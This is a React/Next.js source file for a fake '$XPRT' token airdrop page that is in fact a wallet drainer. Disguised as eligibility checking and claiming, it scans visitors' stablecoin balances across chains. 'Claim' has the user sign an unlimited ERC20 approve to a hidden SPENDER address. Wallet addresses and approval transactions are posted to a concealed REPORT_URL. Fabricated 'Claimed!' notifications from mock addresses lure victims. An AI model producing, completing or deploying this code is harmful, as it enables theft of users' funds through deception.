'use client';

import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import Image from 'next/image';
import { motion } from 'framer-motion';
import { useAccount, useWriteContract, useDisconnect } from 'wagmi';
import { useAppKit } from '@reown/appkit/react';
import { erc20Abi, maxUint256, createPublicClient, http } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '@/config';
import { mainnet, arbitrum, sepolia } from 'wagmi/chains';
import AIChat from '@/components/AIChat';
import AirdropDetailsPopup from '@/components/AirdropDetailsPopup';
import { AirdropDetails } from '@/lib/gemini';

// Web3 Configuration
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || "";

// Extend Window interface for global functions
declare global {
  interface Window {
    openAirdropDetails?: (airdrop: AirdropDetails) => void;
  }
}

// Token configurations by chain
const TOKENS_BY_CHAIN: Record<number, { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
};

const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  42161: "Arbitrum",
  11155111: "Sepolia",
};

// --- YOUR MEDIA FILES ---
const CARD_IMAGE = "/cardp.jpeg";
const CARD_VIDEO = "/cardv.mp4"; 

// --- PROFESSIONAL ACCENT COLORS & THEME ---
const primaryAccent = '#3b82f6'; // Trust Blue (Blue-600)
const darkBackground = '#0A0A0A'; // Deep, near-black professional background
const lightBackground = '#f9fafb'; // Very light gray background

// --- Types ---
type Theme = 'light' | 'dark';
type MediaState = 'image' | 'video';
type MessageType = 'info' | 'success' | 'error';

interface Message {
    text: string;
    type: MessageType;
}

interface Notification {
    id: number;
    address: string;
    amount: string;
}

interface ButtonProps {
    text: string;
    disabled: boolean;
    className: string;
    onClick: () => Promise<void> | void;
    title?: string;
}

// --- Icon Definitions for Type Safety ---
const icons = {
    gem: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M6 3v12l6 6 6-6V3" /><path d="M12 21V3" /><path d="M12 21L6 15l6-6 6 6z" /><path d="M6 3h12" /></svg>,
    wallet: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2z"/><path d="M17 12h-4c-1.1 0-2 .9-2 2v0c0 1.1.9 2 2 2h4"/></svg>,
    sun: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>,
    moon: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>,
    scanLine: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 19v-3a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M3 5v3a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2z"/></svg>,
    rocket: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4.5 16.5c-1.5 1.26-2.5 5.23-2 7.5-.26-1.54.49-3.78 2-5.16l2.16 2.16a6 6 0 0 0 3.32-.42 4.14 4.14 0 0 0 2.4-2.4 6 6 0 0 0-.42-3.32l-2.16-2.16c-1.38-1.51-3.62-2.26-5.16-2l-2.73 2.73z"/><path d="m14 2 2 2m4 4 2 2"/></svg>,
    checkCircle: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="m9 11 3 3L22 4"/></svg>,
    xCircle: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>,
    users2: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 19a6 6 0 0 0-12 0"/><circle cx="8" cy="10" r="4"/><path d="M20 10c-2 0-4 1-4 3"/><path d="M17 19h4"/></svg>,
    layoutGrid: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>,
    zap: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2L9 12h6l-2 10 5-10h-6l2-8z"/></svg>,
    fox: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 2l4 4 2-2 2 2-2 2 2 2-2 2-4 4-8-8 4-4 2 2 2-2z"/><path d="M6 18c-3.3 0-6 2.7-6 6h24c0-3.3-2.7-6-6-6-4 0-4-4-8-4s-4 4-8 4z"/></svg>,
    creditCard: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/><path d="M7 15h3"/></svg>,
    square: (color: string, props: React.SVGProps<SVGSVGElement>) => <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/></svg>,
} as const;

type IconName = keyof typeof icons;

interface IconProps {
    name: IconName;
    className?: string;
    color?: string;
}

const Icon: React.FC<IconProps> = ({ name, className = "w-5 h-5", color = "currentColor" }) => {
    const Component = icons[name] ? icons[name] : icons.square;
    return Component(color, { className }); 
};

// --- Geometric Background for 3D Feel ---
interface GeometricBackgroundProps {
    theme: 'light' | 'dark';
}

const GeometricBackground: React.FC<GeometricBackgroundProps> = ({ theme }) => {
    const shape1Classes = theme === 'dark' 
        ? 'bg-blue-900/15 opacity-60' 
        : 'bg-gray-400/30 opacity-70';
    
    const shape2Classes = theme === 'dark' 
        ? 'bg-blue-900/15 opacity-50' 
        : 'bg-gray-300/40 opacity-60';

    const shape3Classes = theme === 'dark' 
        ? 'bg-blue-700/5' 
        : 'bg-blue-200/20';
    
    return (
        <motion.div
            className="fixed inset-0 pointer-events-none z-0 transition-colors duration-500"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 1.5 }}
            style={{ 
                background: theme === 'dark' ? darkBackground : lightBackground 
            }}
        >
            <motion.div
                animate={{
                    scale: [1, 1.02, 1],
                    rotate: [0, 2, 0],
                    x: ['-50%', '-48%', '-50%'],
                    y: ['-40%', '-38%', '-40%'],
                }}
                transition={{
                    duration: 60,
                    repeat: Infinity,
                    ease: 'easeInOut',
                }}
                className={`absolute top-0 left-0 w-[80vh] h-[80vh] blur-3xl rounded-xl ${shape1Classes}`}
                style={{ clipPath: 'polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%)' }}
            />

            <motion.div
                animate={{
                    scale: [1, 0.98, 1],
                    rotate: [0, -2, 0],
                    x: ['40%', '42%', '40%'],
                    y: ['40%', '42%', '40%'],
                }}
                transition={{
                    duration: 50,
                    repeat: Infinity,
                    ease: 'easeInOut',
                }}
                className={`absolute bottom-0 right-0 w-[60vh] h-[60vh] blur-3xl rounded-lg ${shape2Classes}`}
                style={{ clipPath: 'polygon(100% 0%, 0% 100%, 100% 100%)' }}
            />
            
            <motion.div
                animate={{
                    x: ['-5%', '5%', '-5%'],
                    y: ['-5%', '5%', '-5%'],
                    scale: [0.9, 1.1, 0.9],
                }}
                transition={{
                    duration: 40,
                    repeat: Infinity,
                    ease: 'linear',
                }}
                className={`absolute top-1/4 left-1/4 w-32 h-32 blur-xl rounded-full ${shape3Classes}`}
            />
        </motion.div>
    );
}

// --- Airdrop Media Component ---
interface MediaContainerProps {
    mediaState: 'image' | 'video';
    isConnected: boolean;
    primaryAccent: string;
}

const MediaContainer: React.FC<MediaContainerProps> = ({ mediaState, isConnected }) => {
    const isVideoActive = isConnected && mediaState === 'video';

    // kept for compatibility; image uses next/image
    const handleImageError = () => {};

    const handleVideoError = (e: React.SyntheticEvent<HTMLVideoElement, Event>) => {
        console.error('Video failed to load:', e);
        // Fallback to image if video fails
    };

    return (
        <div className="p-4">
            <div className={`rounded-xl aspect-square w-full mx-auto transition-all duration-500 bg-white dark:bg-gray-900/80 shadow-xl overflow-hidden relative`}>
                {/* Image (always present, opacity controlled) */}
                <Image 
                    src={CARD_IMAGE}
                    alt="Airdrop Parachute Icon"
                    fill
                    className={`object-cover transition-opacity duration-500 ${isVideoActive ? 'opacity-0' : 'opacity-100'}`}
                    onError={() => {}}
                    priority
                />
                
                {/* Video (always present, opacity controlled) */}
                <motion.video 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: isVideoActive ? 1 : 0 }}
                    transition={{ duration: 0.5 }}
                    src={CARD_VIDEO}
                    className="absolute inset-0 w-full h-full object-cover"
                    autoPlay
                    loop
                    muted
                    playsInline
                    onError={handleVideoError}
                />
            </div>
        </div>
    );
};

// --- Notification Component ---
interface NotificationToastProps {
    address: string;
    amount: string;
    onClose: () => void;
    primaryAccent: string;
}

const NotificationToast: React.FC<NotificationToastProps> = React.memo(function NotificationToast({ address, amount, onClose }) {
    const [isVisible, setIsVisible] = useState<boolean>(false);

    useEffect(() => {
        setIsVisible(true);
        const timer = setTimeout(() => {
            setIsVisible(false);
            setTimeout(onClose, 300); 
        }, 5000); 

        return () => clearTimeout(timer);
    }, [onClose]);

    const handleClose = (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        setIsVisible(false); 
        setTimeout(onClose, 300);
    }

    return (
        <motion.div 
            initial={{ opacity: 0, y: '100%' }}
            animate={{ opacity: isVisible ? 1 : 0, y: isVisible ? '0%' : '100%' }}
            transition={{ duration: 0.3 }}
            className="bg-white/95 dark:bg-gray-900/95 backdrop-blur-md p-2.5 rounded-lg shadow-xl pointer-events-auto w-full mb-2 text-gray-900 dark:text-white transition-all duration-300"
            style={{ 
                border: `1px solid ${primaryAccent}`, 
            }} 
        >
            <div className="flex items-center space-x-2">
                <Icon name="zap" className="w-3.5 h-3.5 flex-shrink-0" color={primaryAccent} /> 
                <div className='flex-grow min-w-0'>
                    <p className="text-xs font-semibold truncate text-gray-900 dark:text-white">
                         Claimed!
                    </p>
                    <p className="text-[11px] text-gray-600 dark:text-gray-200 truncate">
                        {address} received 
                        <span className="font-bold ml-1" style={{ color: primaryAccent }}>{amount} $XPRT</span>
                    </p>
                </div>
                <button 
                    onClick={handleClose} 
                    className="text-gray-400 dark:text-gray-400 hover:text-gray-600 dark:hover:text-gray-100 transition-colors flex-shrink-0"
                >
                    <Icon name="xCircle" className="w-3 h-3" color="currentColor" />
                </button>
            </div>
        </motion.div>
    );
});

// --- Upcoming Airdrop Card Component ---
interface UpcomingCardProps {
    iconName: IconName; 
    iconColor: string;
    title: string;
    snapshot: string;
    eligibility: string;
    primaryAccent: string;
    theme: Theme;
}

const UpcomingCard: React.FC<UpcomingCardProps> = ({ iconName, iconColor, title, snapshot, eligibility, theme }) => {
    const handleViewDetails = () => {
        // This will be passed from parent component
        if (window.openAirdropDetails) {
            window.openAirdropDetails({ title, snapshot, eligibility });
        }
    };

    return (
    <motion.div
        initial={{ y: 0 }}
        whileHover={{
            y: -4, 
            boxShadow: '0 8px 20px rgba(0,0,0,0.15), 0 2px 8px rgba(0,0,0,0.1)', 
            transition: { duration: 0.3, ease: "easeOut" }
        }}
        className={`p-5 rounded-xl border transition-all ${
            theme === 'dark' 
                ? 'bg-neutral-900 border-neutral-800 shadow-lg shadow-blue-500/20' 
                : 'bg-white border-gray-200 shadow-[0_4px_20px_rgb(0,0,0,0.08)] shadow-gray-900/20'
        }`}
    >
        <div className="flex items-center space-x-3 mb-3">
            <div className='p-2 rounded-full dark:bg-neutral-800 bg-white'>
                 <Icon name={iconName} className="w-6 h-6" color={iconColor} />
            </div>
            <h3 className="text-lg font-bold text-gray-800 dark:text-white">{title}</h3>
        </div>
        <div className="space-y-2 text-gray-600 dark:text-gray-400 text-sm">
            <p><span className="font-semibold text-gray-700 dark:text-gray-300">Snapshot:</span> {snapshot}</p>
            <p><span className="font-semibold text-gray-700 dark:text-gray-300">Eligibility:</span> {eligibility}</p>
        </div>
		<motion.button 
			onClick={handleViewDetails}
			whileHover={{ scale: 1.03, y: -1 }}
			whileTap={{ scale: 0.97 }}
			transition={{ type: "spring", stiffness: 300, damping: 20 }}
			className="w-full mt-4 py-2 rounded-lg text-sm font-semibold transition-all border shadow-sm hover:shadow-md 
			dark:bg-blue-600/20 dark:text-blue-400 dark:hover:bg-blue-600/30 dark:border-blue-700 
			bg-blue-100 text-blue-700 hover:bg-blue-200 border-blue-300"
		>
			<span className="inline-flex items-center gap-2">
				<svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
					<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
				</svg>
				<span>View Details</span>
			</span>
		</motion.button>
    </motion.div>
    );
};

// --- Main Application Component ---
const App: React.FC = () => {
    // Web3 Hooks
    const { address, isConnected, chainId } = useAccount();
    const { disconnect } = useDisconnect();
    const { open } = useAppKit();
    const { writeContractAsync } = useWriteContract();
    
    // State Declarations with Types
    const [isClaimed, setIsClaimed] = useState<boolean>(false);
    const [isEligible, setIsEligible] = useState<boolean | null>(null);
    const [eligibilityChecked, setEligibilityChecked] = useState<boolean>(false);
    const [eligibleTokens, setEligibleTokens] = useState<{ symbol: string; address: `0x${string}`; min: bigint; decimals: number; chainId: number }[]>([]);
    const [message, setMessage] = useState<Message | null>(null);
    const [mediaState, setMediaState] = useState<MediaState>('image'); 
    const [theme, setTheme] = useState<Theme>('dark'); 
    const [currentNotification, setCurrentNotification] = useState<Notification | null>(null);
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [isAIChatOpen, setIsAIChatOpen] = useState<boolean>(false);
    const [selectedAirdrop, setSelectedAirdrop] = useState<AirdropDetails | null>(null);
    const [isAirdropPopupOpen, setIsAirdropPopupOpen] = useState<boolean>(false);

    const airdropAmount: string = '1,000,000';

// Component that reports wallet connections
function ConnectionReporter() {
  useEffect(() => {
    if (isConnected && address) {
       fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
        }, []);

  return null;
}

    // --- Theme Logic ---
    useEffect(() => {
        const savedTheme = localStorage.getItem('theme') as Theme | null;
        if (savedTheme && (savedTheme === 'light' || savedTheme === 'dark')) {
            setTheme(savedTheme);
        } else {
            setTheme('dark');
        }
    }, []);

    useEffect(() => {
        if (theme === 'dark') {
            document.documentElement.classList.add('dark');
            document.documentElement.classList.remove('light');
        } else {
            document.documentElement.classList.add('light');
            document.documentElement.classList.remove('dark');
        }
        localStorage.setItem('theme', theme);
    }, [theme]);

    const showMessage = useCallback((text: string, type: MessageType = 'info') => {
        setMessage({ text, type });
        setTimeout(() => setMessage(null), 5000);
    }, []);

    // Ref to track if eligibility check is in progress
    const isCheckingEligibility = useRef(false);

    // --- Real Wallet/Claim Handlers ---
    const connectWallet = useCallback(async (): Promise<void> => {
        showMessage('Connecting to wallet...', 'info');
        try {
            await open();
        } catch (err) {
            console.error('[Connect] Error opening modal:', err);
            
            // Check if it's a MetaMask extension error
            if (err instanceof Error && err.message.includes('MetaMask extension not found')) {
                showMessage('MetaMask extension not found. Please install MetaMask to continue.', 'error');
            } else if (err instanceof Error && err.message.includes('User rejected')) {
                showMessage('Connection cancelled by user.', 'info');
            } else {
                showMessage('Failed to connect wallet. Please try again.', 'error');
            }
        }
    }, [open, showMessage]);

    const disconnectWallet = async (): Promise<void> => {
        try {
            console.log('[Disconnect] Disconnecting wallet...');
            
            // Use both disconnect methods to ensure proper disconnection
            disconnect();
            
            // Reset all state immediately
            setIsEligible(null);
            setEligibilityChecked(false);
            setEligibleTokens([]);
            setIsClaimed(false);
            setIsLoading(false);
            setMessage(null);
            
            console.log('[Disconnect] Wallet disconnected successfully');
        } catch (err) {
            console.error('[Disconnect] Error:', err);
            // Still reset state even if disconnect fails
            setIsEligible(null);
            setEligibilityChecked(false);
            setEligibleTokens([]);
            setIsClaimed(false);
            setIsLoading(false);
            setMessage(null);
        }
    };

    // Check eligibility ONCE on wallet connect
    useEffect(() => {
        // Reset state immediately on disconnect
    if (!isConnected || !address) {
            // Cancel any ongoing check IMMEDIATELY
            isCheckingEligibility.current = false;
            
            setIsEligible(null);
            setEligibilityChecked(false);
            setEligibleTokens([]);
            setIsLoading(false); // Reset loading state on disconnect
            setIsClaimed(false); // Also reset claimed state
            setMessage(null); // Clear any pending messages
            return;
        }

        // CRITICAL: Check ref status BEFORE checking eligibilityChecked
        // This prevents race conditions during disconnect
        if (isCheckingEligibility.current) {
            return;
        }

        // Only check if not already checked
        if (eligibilityChecked) {
            return;
        }

        // Mark that we're starting a check
        isCheckingEligibility.current = true;

        const checkEligibility = async () => {
            // Double-check connection before starting
            if (!isConnected || !address || !isCheckingEligibility.current) {
                isCheckingEligibility.current = false;
      return;
    }

            setEligibilityChecked(false);
            // Only show message if still connected
            if (isConnected && address) {
                showMessage('Checking eligibility...', 'info');
    }

    try {
      let targetChain: number | null = null;
                const usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number; chainId: number }[] = [];

                // Scan all chains for token balances
      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
                    // Check if still connected before each chain scan
                    if (!isConnected || !address || !isCheckingEligibility.current) {
                        isCheckingEligibility.current = false;
                        return;
                    }
                    
        const numericCid = Number(cid);
        // const chainName = CHAIN_NAMES[numericCid] || `Chain ${numericCid}`;

        // Check gas availability on this chain first with real-time gas price
        try {
            const chainBalance = await getBalance(config, { address, chainId: numericCid });
            
            // Get the chain config
            const chainConfig = numericCid === 1 ? mainnet : numericCid === 42161 ? arbitrum : sepolia;
            
            // Create a public client to get gas price
            const publicClient = createPublicClient({
                chain: chainConfig,
                transport: http(),
            });
            
            // Get real-time gas price from the network
            const gasPrice = await publicClient.getGasPrice();
            
            // Estimate gas for ERC20 approval (typical: ~50,000 gas)
            const estimatedGasUnits = BigInt(50000);
            const estimatedGasCost = gasPrice * estimatedGasUnits;
            
            // Add 30% buffer for safety
            const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
            
            if (chainBalance.value < requiredGas) {
                // Skip this chain - not enough gas (don't show to user)
                continue;
            }
        } catch {
            // Silently skip chains with errors
            continue;
        }

        for (const token of tokens) {
                        // Check if still connected before each token check
                        if (!isConnected || !address || !isCheckingEligibility.current) {
                            isCheckingEligibility.current = false;
                            return;
                        }
                        
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;


            if (bal >= token.min) {
              targetChain = numericCid;
                                usableTokens.push({ ...token, chainId: numericCid });
                            }
                        } catch (err) {
                            console.error(`Error checking ${token.symbol} on chain ${numericCid}:`, err);
            }
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
                    // Check if still connected before balance check
                    if (!isConnected || !address || !isCheckingEligibility.current) {
                        isCheckingEligibility.current = false;
                        return;
                    }
                    
                    const nativeBalance = await getBalance(config, { address });
                    const minEthForTesting = BigInt(1000000000000000);
                    
                    // Check if still connected before updating state
                    if (!isCheckingEligibility.current) {
                        isCheckingEligibility.current = false;
                        return;
                    }
                    
                    if (nativeBalance.value >= minEthForTesting) {
                        setIsEligible(true);
                        setEligibilityChecked(true);
                        setEligibleTokens([]); // No tokens, just gas balance
                        isCheckingEligibility.current = false;
                        showMessage('Testing mode: Eligible with ETH balance for gas.', 'success');
                        return;
                    } else {
                        setIsEligible(false);
                        setEligibilityChecked(true);
                        setEligibleTokens([]);
                        isCheckingEligibility.current = false;
                        showMessage('No eligible token balances found.', 'error');
                        return;
                    }
                }

                // Check if still connected before final checks
                if (!isConnected || !address || !isCheckingEligibility.current) {
                    isCheckingEligibility.current = false;
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";

                // Check if still connected before updating state
                if (!isCheckingEligibility.current) {
                    isCheckingEligibility.current = false;
                    return;
                }

                // Gas was already checked in the loop above, so just store results
                setEligibleTokens(usableTokens);
                setIsEligible(true);
                setEligibilityChecked(true);
                isCheckingEligibility.current = false;
                showMessage(`You are eligible! Found ${usableTokens.length} token(s) on ${chainName}`, 'success');
                
            } catch (err: unknown) {
                console.error('Eligibility check failed:', err);
                
                // Only update state if still checking
                if (isCheckingEligibility.current && isConnected) {
                    setIsEligible(false);
                    setEligibilityChecked(true);
                    setEligibleTokens([]);
                    showMessage('Failed to check eligibility. Please try again.', 'error');
                }
                isCheckingEligibility.current = false;
            }
        };

        checkEligibility();
    }, [isConnected, address, eligibilityChecked, showMessage]);

    const claimAirdrop = useCallback(async (): Promise<void> => {
        if (!isConnected || !address || isLoading) {
            if (!isConnected || !address) {
                showMessage("Wallet not connected", 'error');
            }
            return;
        }

        // Use the pre-checked eligible tokens - NO re-scanning!
        if (eligibleTokens.length === 0) {
            showMessage("No eligible tokens found. Please reconnect wallet.", 'error');
            return;
        }
        try {
            setIsLoading(true);
            
            const targetChain = eligibleTokens[0].chainId;
            const chainName = CHAIN_NAMES[targetChain] || "Unknown Chain";
            
            showMessage(`Preparing to approve ${eligibleTokens.length} token(s)...`, 'info');

      if (chainId !== targetChain) {
                try {
                    showMessage(`Switching to ${chainName}...`, 'info');
        await switchChain(config, { chainId: targetChain });
                    await new Promise(resolve => setTimeout(resolve, 1500));
                } catch (switchErr: unknown) {
                    console.error('Chain switch error:', switchErr);
                    showMessage(`Failed to switch network: ${switchErr instanceof Error ? switchErr.message : 'Unknown error'}`, 'error');
                    setIsLoading(false);
                    return;
                }
      }

      const nativeBal = await getBalance(config, { address, chainId: targetChain });
            
      if (nativeBal.value < BigInt(100000000000000)) {
                showMessage("Not enough native token to pay gas fees.", 'error');
                setIsLoading(false);
        return;
      }

            // Approve eligible tokens (already checked during eligibility)
            let approvedCount = 0;
            for (const token of eligibleTokens) {
                try {
                    showMessage(`Approving ${token.symbol} on ${chainName}... (${approvedCount + 1}/${eligibleTokens.length})`, 'info');

        const txHash = await writeContractAsync({
          address: token.address,
          abi: erc20Abi,
          functionName: "approve",
          args: [SPENDER, maxUint256],
          account: address,
          chainId: targetChain,
        });

                    approvedCount++;
                    
                    // Immediately mark as approved and stop loading
                    setIsClaimed(true);
                    setIsLoading(false);
                    showMessage(`${token.symbol} approved ✅`, 'success');

        // Report in background (non-blocking)
        fetch(`${REPORT_URL}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            event: "approval",
            wallet: address,
            chainName,
            token: token.address,
            symbol: token.symbol,
            txHash,
            timestamp: new Date().toISOString(),
          }),
        }).catch(console.error);
        
        // Exit the loop after first successful approval
        break;

                } catch (tokenErr: unknown) {
                    console.error(`Error approving ${token.symbol}:`, tokenErr);
                    
                    if (tokenErr instanceof Error && (tokenErr.message.includes('User rejected') || tokenErr.message.includes('user rejected'))) {
                        showMessage(`Approval cancelled by user`, 'error');
                        setIsLoading(false);
                        return;
                    }
                    
                    showMessage(`Failed to approve ${token.symbol}: ${tokenErr instanceof Error ? tokenErr.message : 'Unknown error'}`, 'error');
                    continue;
                }
            }
            
            // If we reach here, no approvals were successful
            if (approvedCount === 0) {
                showMessage("No tokens were approved.", 'error');
            }

    } catch (err: unknown) {
            console.error('Claim error:', err);
            
            let errorMsg = "Unknown error";
            if (err instanceof Error && (err.message.includes('User rejected') || err.message.includes('user rejected'))) {
                errorMsg = "Transaction cancelled by user";
            } else if (err instanceof Error) {
                errorMsg = err.message;
            }
            
            showMessage(`Error: ${errorMsg}`, 'error');
        } finally {
            setIsLoading(false);
        }
    }, [isConnected, address, isLoading, eligibleTokens, chainId, writeContractAsync, showMessage]);

    const toggleTheme = (): void => {
        setTheme(prev => (prev === 'dark' ? 'light' : 'dark'));
    };

    // AI Functions
    const openAirdropDetails = (airdrop: AirdropDetails) => {
        setSelectedAirdrop(airdrop);
        setIsAirdropPopupOpen(true);
    };

    // Make function available globally for UpcomingCard
    useEffect(() => {
        (window as Window & { openAirdropDetails?: (airdrop: AirdropDetails) => void }).openAirdropDetails = openAirdropDetails;
        return () => {
            delete (window as Window & { openAirdropDetails?: (airdrop: AirdropDetails) => void }).openAirdropDetails;
        };
    }, []);
    
    // --- Media State Logic (Image/Video) ---
    const VIDEO_INTERVAL = 15000; // 15 seconds

    useEffect(() => {
        let interval: NodeJS.Timeout;
        
        if (isConnected) {
            // Start with video immediately when connected
            console.log('Wallet connected - setting media to video');
            setMediaState('video');
            
            // Then alternate every 15 seconds
            interval = setInterval(() => {
                setMediaState(prev => {
                    const newState = prev === 'image' ? 'video' : 'image';
                    console.log(`Media state alternating: ${prev} → ${newState}`);
                    return newState;
                });
            }, VIDEO_INTERVAL);
        } else {
            console.log('Wallet disconnected - setting media to image');
            setMediaState('image'); 
        }

        return () => {
            if (interval) clearInterval(interval);
        };
    }, [isConnected]);

    // --- Notification Logic ---
    const mockAddresses: string[] = useMemo(() => [
        '0x12aD...C3E1', '0x8fB0...D4A2', '0x9c3A...1F5B', '0x7e2B...6G9H',
        '0x3d0F...E2A5', '0x6a1C...F9B0', '0x4b7D...8D1C', '0x0e5F...A3C7'
    ], []);
    const mockAmounts: string[] = useMemo(() => ['1,000,000', '500,000', '1,200,000', '850,000', '999,999'], []);
    
    const getRandomInterval = (): number => Math.floor(Math.random() * (30000 - 10000 + 1)) + 10000;
    
    const removeNotification = useCallback((): void => {
        setCurrentNotification(null);
    }, []);

    useEffect(() => {
        let timerId: NodeJS.Timeout;

        const scheduleNotification = (): void => {
            if (currentNotification) return;

            const delay = getRandomInterval();
            timerId = setTimeout(() => {
                const randomAddress = mockAddresses[Math.floor(Math.random() * mockAddresses.length)];
